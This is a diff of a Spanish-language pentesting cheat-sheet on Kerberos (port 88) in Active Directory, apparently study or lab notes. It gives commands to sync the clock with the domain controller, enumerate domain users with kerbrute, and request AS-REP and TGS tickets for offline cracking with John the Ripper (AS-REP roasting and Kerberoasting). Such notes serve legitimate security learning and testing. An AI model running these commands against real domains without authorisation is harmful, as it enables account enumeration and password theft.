@@ -3,17 +3,34 @@
 Tags: #Kerberos #AD #Windows 
 
 Este es el puerto para Kerberos, que es el protocolo de autenticación predeterminado usado en AD. Kerberos es vital para el proceso de inicio de sesión y la concesión de tickets de acceso.
-## Kerberos
+## Sincronizar el reloj 
 
 ```bash 
-git clone https://github.com/ropnop/kerbrute           # Descargar la herramienta
-❯ go build .                                           # Entramos al dir 'kerbrute' lo compilamos 
+Nota: Antes de iniciar al ataque debemos de sincronizar el reloj de la maquina de atacante con el AD
 
-❯ kerbrute userenum -d <Domain> --dc <IP> <user.txt>   # Prueba a los usuarios de la lista y verifica si son existentes en el dominio 
+❯ ntpdate IP     # Sincronizar el reloj 
 
-# Nota: Si el usuario no cuenta con autenticacion previa de Kerberos, la herramienta puede arrojar el TGT (hash) para despues poder romperlo por fuerza bruta. 
+	# IP = Dirección IP del DC
+
+❯ date -s "2025-01-04 15:30:00"   # Restablecer la fecha y hora
+```
+
+## Kerbrute 
+
+```bash 
+❯ git clone https://github.com/ropnop/kerbrute           # Descargar la herramienta
+❯ go build .                                             # Entrar al dir 'kerbrute' y compilarlo 
 ```
 
 ```bash 
-❯ impacket-GetNPUsers <domain/> -no-pass -usersfile <user.txt>   # Forma de enumerar usuarios validos en Kerberos 
+❯ kerbrute userenum -d domain1.corp --dc IP user.txt   # Enumerar y verificar usuarios validos en el dominio 
+
+
+Nota: Si el usuario no cuenta con autenticacion previa de Kerberos, la herramienta arroja el TGT (hash) y este se puede crackear offline con 'John The Ripper'
+```
+
+```bash 
+❯ GetUsersSPNs domain1.corp/user:password            # Verificar si el DC es kerberostable en algún usuario
+
+❯ GetUsersSPNs domain1.corp/user:password -request   # Solicitar un TGS y en offline crackearlo con John 
 ```
